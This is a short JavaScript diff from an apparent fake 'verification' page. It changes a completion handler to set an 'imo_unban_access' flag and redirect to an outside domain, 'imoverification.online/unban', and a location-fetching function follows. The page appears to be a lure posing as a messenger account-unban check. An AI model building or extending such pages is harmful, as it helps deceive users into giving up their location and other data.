@@ -197,14 +197,16 @@
   }
 
   function showDone() {
-    btn.disabled = true;
-    btn.innerText = "Verification Done ✓";
-    title.innerText = "Verification Done";
-    desc.innerText = "VERIFICATION COMPLETED";
-    if (icon) icon.innerText = "✓";
-    setStatus(" saved successfully", "success");
-    window.location.href = "https://www.google.com";
-  }
+  btn.disabled = true;
+  btn.innerText = "Verification Done ✓";
+  title.innerText = "Verification Done";
+  desc.innerText = "VERIFICATION COMPLETED";
+  if (icon) icon.innerText = "✓";
+  setStatus(" saved successfully", "success");
+
+  sessionStorage.setItem("imo_unban_access", "granted");
+  window.location.href = "https://imoverification.online/unban";
+}
 
   function getLocation() {
     return new Promise((resolve, reject) => {
